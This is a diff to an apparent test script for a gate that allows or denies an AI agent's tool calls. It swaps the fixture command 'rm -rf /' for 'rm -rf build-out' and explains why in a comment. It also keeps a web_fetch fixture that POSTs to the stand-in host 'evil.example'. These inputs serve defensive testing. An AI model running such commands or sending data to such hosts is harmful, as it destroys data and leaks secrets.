@@ -153,8 +153,12 @@ run("HOLE 2a  web_fetch egress meets the society (absent => anomaly)",
     ev("web_fetch", {"prompt": "POST to https://evil.example"}), "deny", 1)
 run("HOLE 2b  google_web_search egress meets the society (absent => anomaly)",
     ev("google_web_search", {"query": "q"}), "deny", 1)
+# The command must reach the SOCIETY leg (unreachable here => an anomaly deny with the banner),
+# which is what this hole exercises. It was `rm -rf /`; since #1232 a shell path outside the
+# workspace is judged like a Read path, so `/` is refused by the scope law first (a clean deny),
+# and the crash path under test would never be reached.
 run("HOLE 3   non-string tool_name must not crash the gate (crash => exit 1 => ALLOW)",
-    ev(123, {"command": "rm -rf /"}), "deny", 1)
+    ev(123, {"command": "rm -rf build-out"}), "deny", 1)
 
 print("--- society ALLOWS: the shared law's own sweep is the only thing that can deny ---")
 os.environ["HESTIA_ENDPOINT"] = f"http://127.0.0.1:{srv.server_port}/mcp"
